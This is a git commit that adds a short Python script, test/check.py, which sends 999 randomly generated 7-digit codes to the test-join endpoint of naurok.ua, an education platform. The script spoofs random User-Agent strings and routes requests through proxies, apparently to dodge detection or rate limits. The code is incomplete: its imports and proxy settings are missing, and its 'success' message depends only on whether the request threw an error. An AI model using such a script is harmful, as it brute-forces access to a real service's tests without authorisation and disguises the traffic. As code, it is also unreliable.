4f8d036790324a2bed2e822bb41b3cc22695a38c
rigcun2 <132059122+rigcun2@users.noreply.github.com>
2023-04-28 15:01:02 +0300

    Update check.py

--- test/check.py
+++ test/check.py
@@ -1,1 +1,10 @@
-
+for i in range(999):
+    kod = ''
+    for i in range(7):
+        kod = str(random.choice('1234567890') + kod)
+    headers = {"UserAgent": fake_useragent.UserAgent().random}
+    try:
+        requests.post("https://naurok.ua/test/join", data={"phone": kod}, headers=headers, proxies=proxies)
+        print('мае')
+    except:
+        print('немае')
